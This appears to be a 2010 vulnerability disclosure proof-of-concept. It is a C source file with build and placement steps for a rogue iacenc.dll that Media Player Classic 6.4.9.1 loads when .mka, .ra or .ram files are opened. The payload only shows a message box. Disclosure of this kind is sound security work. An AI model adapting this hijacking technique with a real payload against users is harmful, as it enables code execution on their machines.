/*

 Media Player Classic 6.4.9.1 (iacenc.dll) DLL Hijacking Exploit

 Vendor: Gabest
 Product Web Page: http://sourceforge.net/projects/guliverkli
 Affected Version: 6.4.9.1 (revision 73)

 Summary: Media Player Classic (MPC) is a compact media player for
 32-bit Microsoft Windows. The application mimics the look and feel
 of the old, lightweight Windows Media Player 6.4 but integrates
 most options and features found in modern media players. It and
 its forks are standard media players in the K-Lite Codec Pack and
 the Combined Community Codec Pack.

 Desc: Media Player Classic suffers from a dll hijacking vulnerability
 that enables the attacker to execute arbitrary code on a local
 level. The vulnerable extensions are .mka, .ra and .ram thru iacenc.dll
 library.

 ----
 gcc -shared -o iacenc.dll mplayerc.c

 Compile and rename to iacenc.dll, create a file test.mka or any of the
 above vulnerable extensions and put both files in same dir and execute.
 ----

 Tested on Microsoft Windows XP Professional SP3 (EN)



 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
 liquidworm gmail com

 Zero Science Lab - http://www.zeroscience.mk


 25.08.2010

*/


#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		dll_mll();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

int dll_mll()
{
	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}